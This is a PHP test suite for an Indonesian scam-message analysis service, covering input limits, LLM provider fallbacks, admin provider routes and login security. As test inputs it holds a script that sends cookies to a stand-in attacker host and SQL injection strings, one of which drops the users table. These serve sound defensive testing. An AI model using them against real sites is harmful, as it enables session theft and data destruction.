<?php

namespace Tests\Feature\Adversarial;

use App\Models\LlmProvider;
use App\Models\User;
use App\Services\Llm\Drivers\CustomRouterDriver;
use App\Services\Llm\Drivers\GeminiDriver;
use App\Services\Llm\Drivers\MockLlmDriver;
use App\Services\Llm\Drivers\OpenAiDriver;
use App\Services\Llm\FraudAnalysisResult;
use App\Services\Llm\LlmManager;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Schema;

/*
|--------------------------------------------------------------------------
| Section 1: ChatController Parameter Boundaries & Edge Conditions
|--------------------------------------------------------------------------
*/

describe('Section 1: ChatController Parameter Boundaries & Edge Conditions', function () {
    test('content at exact lower boundary of 3 characters is accepted', function (string $endpoint) {
        $response = $this->postJson($endpoint, [
            'content' => 'abc',
        ]);

        $response->assertOk();
        $response->assertJsonPath('success', true);
        expect($response->json('data.risk_level'))->toBe('LOW');
    })->with(['/chat/analyze', '/api/chat/analyze']);

    test('content below lower boundary of 3 characters is rejected with 422', function (string $endpoint, string $shortInput) {
        $response = $this->postJson($endpoint, [
            'content' => $shortInput,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['content']);
        $errorMsg = $response->json('errors.content.0');
        expect(strtolower($errorMsg))->toMatch('/(wajib|minimal|karakter|3)/');
    })->with(['/chat/analyze', '/api/chat/analyze'])->with([
        'Empty string' => '',
        'One char' => 'a',
        'Two chars' => 'ab',
    ]);

    test('whitespace-only content is rejected with 422 after trimming', function (string $endpoint) {
        $response = $this->postJson($endpoint, [
            'content' => '     ',
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['content']);
    })->with(['/chat/analyze', '/api/chat/analyze']);

    test('content at exact upper boundary of 10,000 characters is accepted', function (string $endpoint) {
        $exact10000 = str_repeat('A', 10000);
        expect(strlen($exact10000))->toBe(10000);

        $response = $this->postJson($endpoint, [
            'content' => $exact10000,
        ]);

        $response->assertOk();
        $response->assertJsonPath('success', true);
    })->with(['/chat/analyze', '/api/chat/analyze']);

    test('content exceeding upper boundary of 10,000 characters (10,001 chars) is rejected with 422', function (string $endpoint) {
        $exceeding10001 = str_repeat('A', 10001);
        expect(strlen($exceeding10001))->toBe(10001);

        $response = $this->postJson($endpoint, [
            'content' => $exceeding10001,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['content']);
        $errorMsg = $response->json('errors.content.0');
        expect(strtolower($errorMsg))->toMatch('/(maksimal|10000|karakter)/');
    })->with(['/chat/analyze', '/api/chat/analyze']);

    test('multi-byte UTF-8 characters and Indonesian vernacular text are processed safely', function (string $endpoint) {
        $multibytePayload = '⚠️ Halo kak! Ada kiriman paket kurir J&T tertahan di gudang nih. Download file foto_paket.apk ya 🙏📲';

        $response = $this->postJson($endpoint, [
            'content' => $multibytePayload,
        ]);

        $response->assertOk();
        $response->assertJsonPath('data.risk_level', 'HIGH');
        expect($response->json('data.red_flags'))->not->toBeEmpty();
    })->with(['/chat/analyze', '/api/chat/analyze']);

    test('content containing null bytes is handled safely without crashing', function (string $endpoint) {
        $nullBytePayload = "Pesan berisi teks awal\0 lalu ada surat undangan pernikahan.apk silakan diinstal";

        $response = $this->postJson($endpoint, [
            'content' => $nullBytePayload,
        ]);

        $response->assertOk();
        expect($response->json('data.risk_level'))->toBe('HIGH');
    })->with(['/chat/analyze', '/api/chat/analyze']);

    test('content containing raw XSS and HTML tags is not executed or corrupted', function (string $endpoint) {
        $xssPayload = '<script>document.location="http://attacker.com/steal?c="+document.cookie</script> Rekening BRI Anda terblokir, klik link berikut';

        $response = $this->postJson($endpoint, [
            'content' => $xssPayload,
        ]);

        $response->assertOk();
        expect($response->json('data.risk_level'))->toBe('HIGH');
    })->with(['/chat/analyze', '/api/chat/analyze']);

    test('parameter alias precedence: explicit content overrides legacy message parameter', function (string $endpoint) {
        $response = $this->postJson($endpoint, [
            'content' => 'Pesan percakapan biasa dan wajar.',
            'message' => 'Surat undangan pernikahan.apk silakan unduh dan instal.',
        ]);

        $response->assertOk();
        // Because 'content' was explicitly provided and contains benign text,
        // it must evaluate 'content' (LOW risk), not the legacy 'message' (HIGH risk)
        expect($response->json('data.risk_level'))->toBe('LOW');
    })->with(['/chat/analyze', '/api/chat/analyze']);

    test('context parameter accepts associative metadata array', function (string $endpoint) {
        $response = $this->postJson($endpoint, [
            'content' => 'Selamat anda memenangkan hadiah undian 100 juta rupiah.',
            'context' => [
                'channel' => 'whatsapp',
                'sender_number' => '+6281234567890',
                'nested' => [
                    'verified' => false,
                    'timestamp' => 1714500000,
                ],
            ],
        ]);

        $response->assertOk();
        expect($response->json('data.risk_level'))->toBe('HIGH');
    })->with(['/chat/analyze', '/api/chat/analyze']);

    test('context parameter rejects non-array types with 422', function (string $endpoint, mixed $invalidContext) {
        $response = $this->postJson($endpoint, [
            'content' => 'Halo selamat siang.',
            'context' => $invalidContext,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['context']);
    })->with(['/chat/analyze', '/api/chat/analyze'])->with([
        'string' => 'not an array',
        'integer' => 12345,
        'boolean' => true,
    ]);

    test('emoji character boundary correctly counts multi-byte characters for min:3 rule', function (string $endpoint) {
        // Two emojis (8 bytes UTF-8, but mb_strlen = 2) must fail min:3
        $resTwo = $this->postJson($endpoint, ['content' => '🎁🎉']);
        $resTwo->assertStatus(422)->assertJsonValidationErrors(['content']);

        // Three emojis (12 bytes UTF-8, mb_strlen = 3) must pass min:3
        $resThree = $this->postJson($endpoint, ['content' => '🎁🎉📱']);
        $resThree->assertOk();
    })->with(['/chat/analyze', '/api/chat/analyze']);

    test('chat analyze endpoints reject HTTP GET requests with 405 Method Not Allowed', function (string $endpoint) {
        $response = $this->get($endpoint);
        $response->assertStatus(405);
    })->with(['/chat/analyze', '/api/chat/analyze']);
});

/*
|--------------------------------------------------------------------------
| Section 2: LlmManager Exception Branches & Upstream Failure Resilience
|--------------------------------------------------------------------------
*/

describe('Section 2: LlmManager Exception Branches & Resilience', function () {
    test('database query failure during getActiveProvider returns null and falls back to mock driver', function () {
        // Drop table temporarily to simulate DB outage / table locking
        Schema::dropIfExists('llm_providers');

        $manager = new LlmManager;
        $result = $manager->analyze('Undangan pernikahan.apk silakan diinstal');

        expect($result)->toBeInstanceOf(FraudAnalysisResult::class);
        expect($result->isMock)->toBeTrue();
        expect($result->fallbackReason)->toContain('No active provider');
        expect($result->riskLevel)->toBe('HIGH');

        // Re-run migration for subsequent tests
        Artisan::call('migrate', ['--force' => true]);
    });

    test('unknown provider key defaults to MockLlmDriver without throwing MatchUnhandledException', function () {
        $provider = new LlmProvider([
            'key' => 'unsupported-ai-vendor',
            'name' => 'Unknown Vendor',
            'model' => 'vendor-v1',
            'is_active' => true,
        ]);

        $manager = new LlmManager;
        $driver = $manager->resolveDriver($provider);

        expect($driver)->toBeInstanceOf(MockLlmDriver::class);
    });

    test('LlmManager gracefully handles upstream client 400 Bad Request', function () {
        DB::table('llm_providers')->delete();
        DB::table('llm_providers')->insert([
            'key' => 'openai',
            'name' => 'OpenAI',
            'model' => 'gpt-4o',
            'api_key' => Crypt::encryptString('dummy-key'),
            'is_active' => true,
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        Http::fake([
            '*api.openai.com*' => Http::response([
                'error' => ['message' => 'Invalid model provided'],
            ], 400),
        ]);

        $manager = new LlmManager;
        $result = $manager->analyze('Undangan pernikahan.apk mohon diinstal');

        expect($result->isMock)->toBeTrue();
        expect($result->fallbackReason)->toContain('OpenAI API returned error: 400');
        expect($result->riskLevel)->toBe('HIGH');
    });

    test('LlmManager gracefully handles upstream 401 Unauthorized invalid API key', function () {
        DB::table('llm_providers')->delete();
        DB::table('llm_providers')->insert([
            'key' => 'gemini',
            'name' => 'Google Gemini',
            'model' => 'gemini-1.5-flash',
            'api_key' => Crypt::encryptString('invalid-gemini-key'),
            'is_active' => true,
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        Http::fake([
            '*generativelanguage.googleapis.com*' => Http::response([
                'error' => ['code' => 401, 'message' => 'API_KEY_INVALID'],
            ], 401),
        ]);

        $manager = new LlmManager;
        $result = $manager->analyze('Paket kurir JNT tertahan di gudang unduh resi.apk');

        expect($result->isMock)->toBeTrue();
        expect($result->fallbackReason)->toContain('Gemini API returned error: 401');
        expect($result->riskLevel)->toBe('HIGH');
    });

    test('LlmManager handles upstream connection reset / network exception', function () {
        DB::table('llm_providers')->delete();
        DB::table('llm_providers')->insert([
            'key' => 'custom',
            'name' => 'Custom Router',
            'model' => 'meta-llama/llama-3.1-8b',
            'api_key' => Crypt::encryptString('dummy-custom-key'),
            'is_active' => true,
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        Http::fake([
            '*openrouter.ai*' => function () {
                throw new ConnectionException('Connection reset by peer');
            },
        ]);

        $manager = new LlmManager;
        $result = $manager->analyze('Rekening BCA Anda terblokir klik tautan ini');

        expect($result->isMock)->toBeTrue();
        expect($result->fallbackReason)->toContain('Connection reset by peer');
        expect($result->riskLevel)->toBe('HIGH');
    });

    test('LlmManager gracefully falls back to MockLlmDriver when database contains corrupted ciphertext in api_key', function () {
        DB::table('llm_providers')->delete();
        DB::table('llm_providers')->insert([
            'key' => 'gemini',
            'name' => 'Google Gemini',
            'model' => 'gemini-1.5-flash',
            'api_key' => 'corrupted-non-encrypted-raw-string-12345',
            'is_active' => true,
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        $manager = new LlmManager;
        $result = $manager->analyze('Undangan pernikahan.apk silakan diinstal');

        expect($result->isMock)->toBeTrue();
        expect($result->fallbackReason)->toBe('Active provider API key is invalid or corrupted.');
    });

    test('LlmProvider hasApiKey returns false and getMaskedApiKey returns fallback when api_key is corrupted ciphertext', function () {
        $provider = new LlmProvider([
            'key' => 'corrupt-key',
            'name' => 'Corrupt Key Provider',
            'model' => 'test-model',
            'is_active' => false,
        ]);
        $provider->setRawAttributes([
            'api_key' => 'corrupted-ciphertext-without-iv-mac',
        ]);

        expect($provider->hasApiKey())->toBeFalse();
        expect($provider->getMaskedApiKey())->toBe('••••••••');
    });
});

/*
|--------------------------------------------------------------------------
| Section 3: Driver Edge Cases (Gemini, OpenAI, CustomRouter)
|--------------------------------------------------------------------------
*/

describe('Section 3: Concrete Driver Edge Cases', function () {
    test('GeminiDriver handles empty candidates array caused by safety block filter', function () {
        $provider = new LlmProvider([
            'key' => 'gemini',
            'name' => 'Google Gemini',
            'model' => 'gemini-1.5-flash',
            'api_key' => 'test-key',
        ]);

        // Simulating Gemini returning promptFeedback block with no candidates
        Http::fake([
            '*generativelanguage.googleapis.com*' => Http::response([
                'promptFeedback' => [
                    'blockReason' => 'SAFETY',
                    'safetyRatings' => [
                        ['category' => 'HARM_CATEGORY_DANGEROUS_CONTENT', 'probability' => 'HIGH'],
                    ],
                ],
            ], 200),
        ]);

        $driver = new GeminiDriver($provider);

        expect(fn () => $driver->analyze('Uji konten berbahaya'))
            ->toThrow(\RuntimeException::class, 'Gemini API returned empty candidate text.');
    });

    test('OpenAiDriver handles null choices content from model refusal', function () {
        $provider = new LlmProvider([
            'key' => 'openai',
            'name' => 'OpenAI',
            'model' => 'gpt-4o',
            'api_key' => 'test-key',
        ]);

        Http::fake([
            '*api.openai.com*' => Http::response([
                'choices' => [
                    [
                        'message' => [
                            'content' => null,
                            'refusal' => 'I cannot process this request.',
                        ],
                    ],
                ],
            ], 200),
        ]);

        $driver = new OpenAiDriver($provider);

        expect(fn () => $driver->analyze('Uji pesan penolakan'))
            ->toThrow(\RuntimeException::class, 'OpenAI API returned empty response content.');
    });

    test('CustomRouterDriver attaches custom_headers to outbound HTTP request', function () {
        $provider = new LlmProvider([
            'key' => 'custom',
            'name' => 'OpenRouter Custom',
            'model' => 'deepseek/deepseek-chat',
            'api_key' => 'sk-openrouter-secret',
            'base_url' => 'https://openrouter.ai/api/v1',
            'custom_headers' => [
                'HTTP-Referer' => 'https://cekara.id',
                'X-Title' => 'Cekara Anti Scam',
                'User-Agent' => 'CekaraGuardian/1.0',
            ],
        ]);

        Http::fake([
            '*openrouter.ai*' => function (Request $request) {
                // Verify all custom headers were injected into outgoing request
                expect($request->header('HTTP-Referer'))->toContain('https://cekara.id');
                expect($request->header('X-Title'))->toContain('Cekara Anti Scam');
                expect($request->header('Authorization'))->toContain('Bearer sk-openrouter-secret');

                return Http::response([
                    'choices' => [
                        [
                            'message' => [
                                'content' => json_encode([
                                    'risk_level' => 'LOW',
                                    'summary' => 'Pesan wajar',
                                    'red_flags' => [],
                                    'recommendations' => ['Aman'],
                                ]),
                            ],
                        ],
                    ],
                ], 200);
            },
        ]);

        $driver = new CustomRouterDriver($provider);
        $result = $driver->analyze('Halo selamat pagi.');

        expect($result->isMock)->toBeFalse();
        expect($result->riskLevel)->toBe('LOW');
    });

    test('OpenAiDriver clamps non-standard risk levels to HIGH defensively', function (string $unknownRiskLevel) {
        $provider = new LlmProvider([
            'key' => 'openai',
            'name' => 'OpenAI',
            'model' => 'gpt-4o',
            'api_key' => 'sk-valid-key',
        ]);

        Http::fake([
            '*api.openai.com*' => Http::response([
                'choices' => [
                    [
                        'message' => [
                            'content' => json_encode([
                                'risk_level' => $unknownRiskLevel,
                                'summary' => 'Hasil evaluasi tidak standar',
                                'red_flags' => [],
                                'recommendations' => [],
                            ]),
                        ],
                    ],
                ],
            ], 200),
        ]);

        $driver = new OpenAiDriver($provider);
        $result = $driver->analyze('Pesan pengujian');

        expect($result->riskLevel)->toBe('HIGH');
    })->with(['VERY_HIGH', 'CRITICAL', 'SEVERE', 'DANGER', 'UNKNOWN']);
});

/*
|--------------------------------------------------------------------------
| Section 4: Admin LLM Provider Controller Edge Conditions & Boundaries
|--------------------------------------------------------------------------
*/

describe('Section 4: Admin LLM Provider Boundaries & Mutations', function () {
    test('store provider rejects duplicate key with 422 validation error', function () {
        $admin = User::factory()->admin()->create();

        // Seed existing provider with key 'gemini'
        LlmProvider::create([
            'name' => 'Original Gemini',
            'key' => 'gemini',
            'model' => 'gemini-1.5-flash',
            'is_active' => true,
        ]);

        $response = $this->actingAs($admin)->post('/admin/llm-providers', [
            'name' => 'Duplicate Gemini',
            'key' => 'gemini', // Duplicate!
            'model' => 'gemini-1.5-pro',
        ]);

        $response->assertSessionHasErrors(['key']);
    });

    test('store provider enforces field length boundaries', function () {
        $admin = User::factory()->admin()->create();

        // Key > 50 characters, Name > 255 characters, Model > 255 characters
        $response = $this->actingAs($admin)->post('/admin/llm-providers', [
            'key' => str_repeat('k', 51),
            'name' => str_repeat('n', 256),
            'model' => str_repeat('m', 256),
            'base_url' => str_repeat('u', 256),
        ]);

        $response->assertSessionHasErrors(['key', 'name', 'model', 'base_url']);
    });

    test('newly stored provider is always inactive regardless of request payload', function () {
        $admin = User::factory()->admin()->create();

        $this->actingAs($admin)->post('/admin/llm-providers', [
            'name' => 'New Provider Inactive Default',
            'key' => 'test-provider-inactive',
            'model' => 'test-model',
            'is_active' => true, // Attempt to set active during creation
        ]);

        $created = LlmProvider::where('key', 'test-provider-inactive')->first();
        expect($created)->not->toBeNull();
        expect($created->is_active)->toBeFalse();
    });

    test('provider key cannot be changed via update route', function () {
        $admin = User::factory()->admin()->create();

        $provider = LlmProvider::create([
            'name' => 'Original Provider',
            'key' => 'immutable-key',
            'model' => 'v1.0',
            'is_active' => false,
        ]);

        $this->actingAs($admin)->put("/admin/llm-providers/{$provider->id}", [
            'name' => 'Renamed Provider',
            'key' => 'attempted-changed-key',
            'model' => 'v2.0',
        ]);

        $provider->refresh();
        expect($provider->name)->toBe('Renamed Provider');
        expect($provider->model)->toBe('v2.0');
        expect($provider->key)->toBe('immutable-key'); // Key remained unchanged
    });

    test('activating an already active provider is idempotent and preserves active state', function () {
        $admin = User::factory()->admin()->create();

        $provider = LlmProvider::create([
            'name' => 'Active Provider',
            'key' => 'active-idempotent',
            'model' => 'v1.0',
            'is_active' => true,
        ]);

        $response = $this->actingAs($admin)->post("/admin/llm-providers/{$provider->id}/activate");
        $response->assertRedirect();

        $provider->refresh();
        expect($provider->is_active)->toBeTrue();
    });

    test('activating one provider deactivates all other providers mutually exclusively', function () {
        $admin = User::factory()->admin()->create();

        $p1 = LlmProvider::create(['name' => 'P1', 'key' => 'p1', 'model' => 'm1', 'is_active' => true]);
        $p2 = LlmProvider::create(['name' => 'P2', 'key' => 'p2', 'model' => 'm2', 'is_active' => false]);
        $p3 = LlmProvider::create(['name' => 'P3', 'key' => 'p3', 'model' => 'm3', 'is_active' => false]);

        expect(LlmProvider::where('is_active', true)->count())->toBe(1);

        // Activate P3
        $this->actingAs($admin)->post("/admin/llm-providers/{$p3->id}/activate");

        expect($p1->refresh()->is_active)->toBeFalse();
        expect($p2->refresh()->is_active)->toBeFalse();
        expect($p3->refresh()->is_active)->toBeTrue();
        expect(LlmProvider::where('is_active', true)->count())->toBe(1);
    });

    test('updating custom_headers with null clears the stored json attribute cleanly', function () {
        $admin = User::factory()->admin()->create();

        $provider = LlmProvider::create([
            'name' => 'Header Test',
            'key' => 'header-test',
            'model' => 'm1',
            'custom_headers' => ['Authorization' => 'Custom'],
            'is_active' => false,
        ]);

        $this->actingAs($admin)->put("/admin/llm-providers/{$provider->id}", [
            'model' => 'm1',
            'custom_headers' => null,
        ]);

        $provider->refresh();
        expect($provider->custom_headers)->toBeNull();
    });

    test('large api keys (2,000 characters) are encrypted and persisted without SQLite text truncation', function () {
        $admin = User::factory()->admin()->create();
        $largeApiKey = 'sk-large-key-'.str_repeat('X123456789', 198);
        expect(strlen($largeApiKey))->toBe(1993);

        $response = $this->actingAs($admin)->post('/admin/llm-providers', [
            'name' => 'Large Key Provider',
            'key' => 'large-key-provider',
            'model' => 'gpt-4o',
            'api_key' => $largeApiKey,
        ]);

        $response->assertRedirect();
        $provider = LlmProvider::where('key', 'large-key-provider')->first();
        expect($provider)->not->toBeNull();
        expect($provider->api_key)->toBe($largeApiKey);
        expect($provider->hasApiKey())->toBeTrue();
    });

    test('complex model identifiers with slashes, colons, and hyphens are accepted', function () {
        $admin = User::factory()->admin()->create();

        $complexModel = 'meta-llama/llama-3.1-70b-instruct:free';
        $response = $this->actingAs($admin)->post('/admin/llm-providers', [
            'name' => 'OpenRouter Llama Free',
            'key' => 'llama-free',
            'model' => $complexModel,
        ]);

        $response->assertRedirect();
        $provider = LlmProvider::where('key', 'llama-free')->first();
        expect($provider->model)->toBe($complexModel);
    });

    test('getMaskedApiKey boundary behavior: 8 chars vs 9 chars', function () {
        // Exactly 8 chars: masked completely with 8 bullets
        $p8 = new LlmProvider(['api_key' => '12345678']);
        expect($p8->getMaskedApiKey())->toBe('••••••••');

        // Exactly 9 chars: first 4, 6 bullets, last 4
        $p9 = new LlmProvider(['api_key' => '123456789']);
        expect($p9->getMaskedApiKey())->toBe('1234••••••6789');
    });

    test('admin provider routes reject unsupported HTTP methods with 405', function () {
        $admin = User::factory()->admin()->create();
        $provider = LlmProvider::create(['name' => 'Test', 'key' => 'test-405', 'model' => 'm', 'is_active' => false]);

        $this->actingAs($admin)->delete("/admin/llm-providers/{$provider->id}")->assertStatus(405);
        $this->actingAs($admin)->patch("/admin/llm-providers/{$provider->id}")->assertStatus(405);
    });
});

/*
|--------------------------------------------------------------------------
| Section 5: Auth & Security Boundaries
|--------------------------------------------------------------------------
*/

describe('Section 5: Auth & Security Boundaries', function () {
    test('user deletion requires correct current_password confirmation', function () {
        $user = User::factory()->create([
            'password' => Hash::make('CorrectPassword123!'),
        ]);

        // Attempt deletion with wrong password
        $failResponse = $this->actingAs($user)->delete(route('profile.destroy'), [
            'password' => 'WrongPassword999!',
        ]);

        $failResponse->assertSessionHasErrors(['password']);
        expect(User::where('id', $user->id)->exists())->toBeTrue();

        // Attempt deletion with correct password
        $successResponse = $this->actingAs($user)->delete(route('profile.destroy'), [
            'password' => 'CorrectPassword123!',
        ]);

        $successResponse->assertRedirect('/');
        $this->assertGuest();
        expect(User::where('id', $user->id)->exists())->toBeFalse();
    });

    test('profile deletion invalidates the session and regenerates token', function () {
        $user = User::factory()->create([
            'password' => Hash::make('SecretPass123!'),
        ]);

        $oldToken = 'test-token-before-deletion';

        $this->actingAs($user)
            ->withSession(['_token' => $oldToken])
            ->delete(route('profile.destroy'), [
                'password' => 'SecretPass123!',
            ]);

        $this->assertGuest();
        expect(session('_token'))->not->toBe($oldToken);
    });

    test('user registration trims leading and trailing whitespace from email', function () {
        $response = $this->post(route('register'), [
            'name' => 'Budi Santoso',
            'email' => 'budi.santoso@example.com',
            'password' => 'BudiPassword123!',
            'password_confirmation' => 'BudiPassword123!',
        ]);

        $response->assertRedirect();
        $user = User::where('email', 'budi.santoso@example.com')->first();
        expect($user)->not->toBeNull();
    });

    test('guest cannot execute profile update or account deletion', function () {
        $this->patch(route('profile.update'), ['name' => 'Hacker'])->assertRedirect(route('login'));
        $this->delete(route('profile.destroy'), ['password' => 'any'])->assertRedirect(route('login'));
    });

    test('login endpoint safely handles SQL injection payloads in email and password fields', function (string $sqlPayload) {
        $response = $this->post(route('login'), [
            'email' => $sqlPayload,
            'password' => $sqlPayload,
        ]);

        // Validation fails for email format or credentials check, but must NOT crash with PDOException
        expect(in_array($response->getStatusCode(), [302, 422]))->toBeTrue();
    })->with([
        "admin'--",
        "' OR '1'='1",
        "admin' UNION SELECT 1, 'admin', 'pass', 1--",
        "'; DROP TABLE users; --",
    ]);

    test('profile update allows user to retain their existing email without unique constraint collision', function () {
        $user = User::factory()->create([
            'email' => 'keep.email@example.com',
            'name' => 'Initial Name',
        ]);

        $response = $this->actingAs($user)->patch(route('profile.update'), [
            'name' => 'Updated Name',
            'email' => 'keep.email@example.com',
        ]);

        $response->assertSessionHasNoErrors();
        $response->assertRedirect(route('profile.edit'));
        expect($user->refresh()->name)->toBe('Updated Name');
    });

    test('profile update rejects attempting to take another users email with Indonesian validation message', function () {
        User::factory()->create(['email' => 'other.user@example.com']);
        $user = User::factory()->create(['email' => 'my.email@example.com']);

        $response = $this->actingAs($user)->patch(route('profile.update'), [
            'name' => 'My Name',
            'email' => 'other.user@example.com',
        ]);

        $response->assertSessionHasErrors(['email']);
        $error = session('errors')->first('email');
        expect(strtolower($error))->toContain('alamat email sudah digunakan');
    });
});
